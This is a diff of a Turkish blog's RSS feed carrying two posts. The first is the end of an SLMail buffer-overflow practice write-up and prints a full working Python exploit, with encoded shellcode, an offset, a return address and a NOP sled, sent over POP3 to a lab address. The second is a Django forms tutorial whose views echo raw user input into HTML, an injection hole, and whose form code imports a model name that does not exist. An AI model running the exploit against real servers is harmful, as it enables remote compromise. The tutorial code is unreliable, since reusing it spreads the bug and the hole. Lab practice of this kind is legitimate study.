+&lt;p&gt;      Bulduğumuz adres ile exploit kodumuzu tekrar düzenleyerek hedefe yönlendiriyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#exploit.py
+#!/usr/bin/python
+# coding=utf-8
+
+import time, struct, sys
+import socket as so
+
+buf =  &quot;&quot;
+buf += &quot;\xdd\xc1\xbf\xfe\x75\x33\xbb\xd9\x74\x24\xf4\x58\x29&quot;
+buf += &quot;\xc9\xb1\x52\x31\x78\x17\x83\xe8\xfc\x03\x86\x66\xd1&quot;
+buf += &quot;\x4e\x8a\x61\x97\xb1\x72\x72\xf8\x38\x97\x43\x38\x5e&quot;
+buf += &quot;\xdc\xf4\x88\x14\xb0\xf8\x63\x78\x20\x8a\x06\x55\x47&quot;
+buf += &quot;\x3b\xac\x83\x66\xbc\x9d\xf0\xe9\x3e\xdc\x24\xc9\x7f&quot;
+buf += &quot;\x2f\x39\x08\x47\x52\xb0\x58\x10\x18\x67\x4c\x15\x54&quot;
+buf += &quot;\xb4\xe7\x65\x78\xbc\x14\x3d\x7b\xed\x8b\x35\x22\x2d&quot;
+buf += &quot;\x2a\x99\x5e\x64\x34\xfe\x5b\x3e\xcf\x34\x17\xc1\x19&quot;
+buf += &quot;\x05\xd8\x6e\x64\xa9\x2b\x6e\xa1\x0e\xd4\x05\xdb\x6c&quot;
+buf += &quot;\x69\x1e\x18\x0e\xb5\xab\xba\xa8\x3e\x0b\x66\x48\x92&quot;
+buf += &quot;\xca\xed\x46\x5f\x98\xa9\x4a\x5e\x4d\xc2\x77\xeb\x70&quot;
+buf += &quot;\x04\xfe\xaf\x56\x80\x5a\x6b\xf6\x91\x06\xda\x07\xc1&quot;
+buf += &quot;\xe8\x83\xad\x8a\x05\xd7\xdf\xd1\x41\x14\xd2\xe9\x91&quot;
+buf += &quot;\x32\x65\x9a\xa3\x9d\xdd\x34\x88\x56\xf8\xc3\xef\x4c&quot;
+buf += &quot;\xbc\x5b\x0e\x6f\xbd\x72\xd5\x3b\xed\xec\xfc\x43\x66&quot;
+buf += &quot;\xec\x01\x96\x29\xbc\xad\x49\x8a\x6c\x0e\x3a\x62\x66&quot;
+buf += &quot;\x81\x65\x92\x89\x4b\x0e\x39\x70\x1c\xf1\x16\x7a\xd7&quot;
+buf += &quot;\x99\x64\x7a\xe6\xe2\xe0\x9c\x82\x04\xa5\x37\x3b\xbc&quot;
+buf += &quot;\xec\xc3\xda\x41\x3b\xae\xdd\xca\xc8\x4f\x93\x3a\xa4&quot;
+buf += &quot;\x43\x44\xcb\xf3\x39\xc3\xd4\x29\x55\x8f\x47\xb6\xa5&quot;
+buf += &quot;\xc6\x7b\x61\xf2\x8f\x4a\x78\x96\x3d\xf4\xd2\x84\xbf&quot;
+buf += &quot;\x60\x1c\x0c\x64\x51\xa3\x8d\xe9\xed\x87\x9d\x37\xed&quot;
+buf += &quot;\x83\xc9\xe7\xb8\x5d\xa7\x41\x13\x2c\x11\x18\xc8\xe6&quot;
+buf += &quot;\xf5\xdd\x22\x39\x83\xe1\x6e\xcf\x6b\x53\xc7\x96\x94&quot;
+buf += &quot;\x5c\x8f\x1e\xed\x80\x2f\xe0\x24\x01\x5f\xab\x64\x20&quot;
+buf += &quot;\xc8\x72\xfd\x70\x95\x84\x28\xb6\xa0\x06\xd8\x47\x57&quot;
+buf += &quot;\x16\xa9\x42\x13\x90\x42\x3f\x0c\x75\x64\xec\x2d\x5c&quot;
+
+data = 2606 * &quot;A&quot; + &quot;\x8f\x35\x4a\x5f&quot; + 16 * &quot;\x90&quot; + buf
+
+try:
+   server = &quot;192.168.0.19&quot;
+   port = 110
+except IndexError:
+   sys.exit()
+s = so.socket(so.AF_INET, so.SOCK_STREAM)
+try:
+   s.connect((server,port))
+   s.recv(1024)
+   s.send('USER user' +'\r\n')
+   s.recv(1024)
+   s.send('PASS ' + data + '\r\n')
+except:
+   print &quot;Connection Failed&quot;
+   sys.exit()
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/buffer-overflow-slmail/exploit.png&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 31 Aug 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2018/08/31/bof-practice-slmail.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2018/08/31/bof-practice-slmail.html</guid>
+        
+        
+        <category>tr</category>
+        
+      </item>
+    
+      <item>
+        <title>Django Giriş [ 3 ]</title>
+        <description>&lt;center&gt;&lt;h3&gt;Django'da Formlar&lt;/h3&gt;&lt;/center&gt;
+
+&lt;p&gt;      Bilindiği üzere HTML formları, kullanıcı ile veritabanı arasında bir iletim görevi yapmaktadır. GET veya POST metodları ile kullanıcıdan gelen verileri sunucu tarafına iletebilirler. Django’da bu işlemleri daha pratik yapabilmemiz için form denilen yapılar bulunur. Bir form sınıfı oluşturarak, HTML ile yapacağımız formu hazır hale getirebiliriz. Django’da formlar daha hızlı ve yönetilmesi daha kolay sistemler oluşturmamızı sağlar. Bunun yanı sıra manuel form oluştururken ortaya çıkabilecek güvenlik zafiyetlerinin de önüne geçilmesini sağlar. Bu yazıda hem Django’nun form sınıfı ile hemde manuel bir şekilde form oluştururak çeşitli uygulamalar gerçekleştireceğiz.&lt;/p&gt;
+
+&lt;center&gt;&lt;h5&gt;Uygulama Oluşturma&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      Bir önceki yazıda oluşturulan proje üzerinden devam ederek yeni bir uygulama oluşturalım.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 manage.py startapp formOperations
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Bu uygulamanın erişilebilir olması için aşağıdaki gibi &lt;code class=&quot;highlighter-rouge&quot;&gt;practice/settings.py&lt;/code&gt; dosyasına ekliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#practice/settings.py
+INSTALLED_APPS = [
+    'django.contrib.admin',
+    'django.contrib.auth',
+    'django.contrib.contenttypes',
+    'django.contrib.sessions',
+    'django.contrib.messages',
+    'django.contrib.staticfiles',
+    'reverseString',
+    'databaseOperations',
+    'formOperations',
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Uygulamayı, projeye ekledikten sonra url’leri düzenleyceğiz. Uygulamamızın &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:8000/formOperations&lt;/code&gt; üzerinden hizmet vermesini istiyoruz. Buna göre önce &lt;code class=&quot;highlighter-rouge&quot;&gt;formOperations&lt;/code&gt; dizini altına uygulamaya ait &lt;code class=&quot;highlighter-rouge&quot;&gt;urls.py&lt;/code&gt; dosyasını oluşturuyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;touch formOperations/urls.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Tarayıcıdan &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:8000/formOperations&lt;/code&gt; araması yapıldığında buraya bakılacak ve karşılık gelen metoda göre işlemler gerçekleştirilecek. Dosyayı aşağıdaki gibi düzenliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/urls.py
+from django.contrib import admin
+from django.conf.urls import url
+from formOperations.views import *
+
+urlpatterns = [
+    url(r'^$', formOperationsHomepage),
+
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Görüldüğü gibi uygulamamızın view kısmını buraya import ettik. Çünkü hatırlayacağımız üzere buradaki &lt;code class=&quot;highlighter-rouge&quot;&gt;formOperationsHomepage()&lt;/code&gt; fonksiyonu orada yer alacaktır. Bu yüzden &lt;code class=&quot;highlighter-rouge&quot;&gt;formOperations/views.py&lt;/code&gt; dosyasını buna uygun düzenliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/views.py
+from django.shortcuts import render,HttpResponse
+
+def formOperationsHomepage(request):
+    return HttpResponse('Form Operations Homepage')
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Buradaki son adım olarak proje dizininde yer alan url dosyasına uygulamamızı eklememiz gerekiyor. Sorgu kök dizinden başladığı için ilk buraya bakılıyor. Son olarak aşağıdaki hali alacaktır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#practice/urls.py
+from django.contrib import admin
+from django.conf.urls import url, include
+from reverseString.views import *
+from databaseOperations.views import *
+from formOperations.views import *
+
+
+urlpatterns = [
+    url('admin/', admin.site.urls),
+    url(r'^$', homepage),
+    url(r'^get_string/$', get_string),
+
+    url(r'^databaseOperations/', include('databaseOperations.urls')),
+
+    url(r'^formOperations/', include('formOperations.urls')),
+
+    url(r'^add_function/$', add_function),
+    url(r'^add_manuel_function/$', add_manuel_function),
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;Model Oluşturma&lt;/h5&gt;&lt;/center&gt;
+
+&lt;p&gt;      Uygulamamız artık tarayıcıdan erişilebilir durumdadır. Bu aşamadan sonra form uygulamamız için öncelikle bir model oluşturalım.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/models.py
+from django.db import models
+
+class EmergencyNumbers(models.Model):
+    name = models.TextField(max_length=50)
+    number = models.TextField(max_length=10)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Model dosyamızı işlemek için aşağıdaki adımları gerçekleştiriyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 manage.py makemigrations
+python3 manage.py migrate
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;Form Oluşturma&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      Uygulamamızın altına gelip &lt;code class=&quot;highlighter-rouge&quot;&gt;formOperations/forms.py&lt;/code&gt; dosyası oluşturuyoruz. Bu dosyanın içeriği model dosyasına uygun bir şekilde oluşturulmalıdır. Kullanıcıdan veriler alındığı zaman bu form üzerinden sunucu tarafına iletilecektir. Model yapısında olduğu gibi burada da her bir form, bir sınıftan oluştur. Altındaki üyeler bu sınfın birer parçasıdır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;formOperations&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;django&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forms&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;django&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forms&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ModelForm&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;models&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;formOperations&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EmergencyNumbersForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ModelForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Meta&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;model&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;formOperations&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
+	    &lt;span class=&quot;s1&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	    &lt;span class=&quot;s1&quot;&gt;'number'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Şimdi bu formu çağırabileceğimiz bir HTML sayfası oluşturacağız. Bunun için &lt;code class=&quot;highlighter-rouge&quot;&gt;formOperations&lt;/code&gt; uygulaması altında bir dizin oluşturup içerisine de ilgili HTML sayfasını ekleyeceğiz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir formOperations/templates
+touch formOperations/templates/add.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Yeni bir sayfa demek, yeni bir url düzenleme demektir. Bu yüzden uygulamamız için &lt;code class=&quot;highlighter-rouge&quot;&gt;formOperations/urls.py&lt;/code&gt; dosyasını düzenleyeceğiz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/urls.py
+from django.contrib import admin
+from django.conf.urls import url
+from formOperations.views import *
+
+urlpatterns = [
+    url(r'^$', formOperationsHomepage),
+    url(r'^add/$', add),
+    url(r'^add_function/$', add_function),
+
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      View bölümüne gidip formu HTML’e gönderme işlemini gerçekleştiriyoruz. Bunun yanı sıra formdan gelen verileri model dosyasına kaydetmek için &lt;code class=&quot;highlighter-rouge&quot;&gt;add_function&lt;/code&gt; adında bir fonksiyon oluşturup, bu fonksiyonu yukarıdaki gibi  &lt;code class=&quot;highlighter-rouge&quot;&gt;formOperations/urls.py&lt;/code&gt; dosyasına ekliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/views.py
+from django.shortcuts import render,HttpResponse
+from .models import EmergencyNumbers
+from .forms import EmergencyNumbersForm
+
+def formOperationsHomepage(request):
+    data = EmergencyNumbers.objects.all()
+    return render(request,'emergencynumber.html',{'data': data})
+
+def add(request):
+    form = EmergencyNumbersForm()
+    return render(request,'add.html',{'form':form})
+
+
+def add_function(request):
+    name = request.POST['name']
+    number = request.POST['number']
+
+    EmergencyNumbers.objects.create(name=name,number=number)
+    message = name + &quot;&amp;lt;br&amp;gt;&quot; + number + &quot;&amp;lt;br&amp;gt;&quot; + &quot;is added!&quot;
+    return HttpResponse(message)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Tarayıcıdan &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.01:8008/formOperations/add&lt;/code&gt; sayfasına gidildiğinde karşımıza oluşturduğumuz form çıkacaktır. Bu form’a veri girildiğinde, veriler &lt;code class=&quot;highlighter-rouge&quot;&gt;add_function&lt;/code&gt; fonksiyonuna post metodu ile gönderilecektir. Gönderilen veriler veritabanına burada kayıt edilecektir.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/templates/add.html
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Add Emergency Number&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Add Emergency Number&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/add_function/&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  {'% csrf_token %}
+  {'{ form }}
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Send&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;Manuel Form Oluşturma&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      Django’nun form özelliğini kullandıktan sonra şimdi de manuel bir şekilde form oluşturup, oradan gelen verileri veritabanına ekleyeceğiz. Öncelikle url dosyamızı düzenleyelim. Son hali aşağıdaki gibi olacaktır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/urls.py
+from django.contrib import admin
+from django.conf.urls import url
+from formOperations.views import *
+
+urlpatterns = [
+    url(r'^$', formOperationsHomepage),
+    url(r'^add/$', add),
+    url(r'^add_function/$', add_function),
+    url(r'^add_manuel/$', add_manuel),
+    url(r'^add_manuel_function/$', add_manuel_function),
+
+
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Devamında views dosyamızı ilgili fonksiyonları ekleyerek düzenliyoruz. Tarayıcıdan &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:8008/formOperations/add_manuel/&lt;/code&gt; çağrıldığı zaman karşımıza &lt;code class=&quot;highlighter-rouge&quot;&gt;add_manuel.html&lt;/code&gt; dosyası çıkacaktır. Bunun içerisinde manuel bir form oluşturacağız. Bu form dosyasından gelen veriler &lt;code class=&quot;highlighter-rouge&quot;&gt;add_manuel_function&lt;/code&gt; fonksiyonuna gönderilecektir. Böylece ekleme işlemi gerçekleştirilecektir.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/views.py
+from django.shortcuts import render,HttpResponse
+from .models import EmergencyNumbers
+from .forms import EmergencyNumbersForm
+
+def formOperationsHomepage(request):
+    data = EmergencyNumbers.objects.all()
+    return render(request,'emergencynumber.html',{'data': data})
+
+def add(request):
+    form = EmergencyNumbersForm()
+    return render(request,'add.html',{'form':form})
+
+
+def add_function(request):
+    name = request.POST['name']
+    number = request.POST['number']
+
+    EmergencyNumbers.objects.create(name=name,number=number)
+    message = name + &quot;&amp;lt;br&amp;gt;&quot; + number + &quot;&amp;lt;br&amp;gt;&quot; + &quot;is added!&quot;
+    return HttpResponse(message)
+
+def add_manuel(request):
+    return render(request,'add_manuel.html')
+
+
+def add_manuel_function(request):
+    name = request.POST['name']
+    number = request.POST['number']
+
+    EmergencyNumbers.objects.create(name=name,number=number)
+    message = name + &quot;&amp;lt;br&amp;gt;&quot; + number + &quot;&amp;lt;br&amp;gt;&quot; + &quot;is added!&quot;
+    return HttpResponse(message)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Manuel HTML formumuz aşağıdaki gibi olacaktır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/templates/add_manuel.html
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Add Emergency Number&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Add Emergency Number&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/add_manuel_function/&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	{'% csrf_token %}
+	Name     : &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+	Number  : &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;number&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Send&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Son olarak veritabanına eklenen verilerin listelenmesi için aşağıdaki gibi bir anasayfa oluşturalım. Anasayfayı çağırdığımızda &lt;code class=&quot;highlighter-rouge&quot;&gt;formOperationsHomepage&lt;/code&gt; fonksiyonu çalışacak ve model dosyasında bulunan tüm verileri getirip ekranda listeleyecektir.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#formOperations/templates/emergencynumber.html
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Emergency Numbers&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Emergency Numbers&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+
+  {'% for emergency in data %}
+  {'{emergency.name}} :
+  {'{emergency.number}}&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+  {'% endfor %}
+
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/django/django-emergency.png&quot; /&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;h3&gt;Sonuç&lt;/h3&gt;&lt;/center&gt;
+&lt;p&gt;      Bu yazıda Django üzerinde hem form metodu ile hemde manuel olarak form oluşturduk. Veritabanı ile bağlantı kurarak POST metodu ile verileri kullanıcıdan alıp sunucuya gönderdik. Not olarak şunu ekleyebilirim. Django &lt;code class=&quot;highlighter-rouge&quot;&gt;CSRF Token&lt;/code&gt; olmadan POST metodunun kullanılmasına izin vermiyor. Uygulamanızın CSRF saldırılarına maruz kalmaması için sizin yerinize bir çok önlemi kendisi alıyor ya da aldırıyor. Bir sonraki yazı da modeller ile ilgili çeşitli işlemler üzerinde duracağız.&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 02 Feb 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2018/02/02/django-giris-3.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2018/02/02/django-giris-3.html</guid>
+        
+        
+        <category>tr</category>
+        
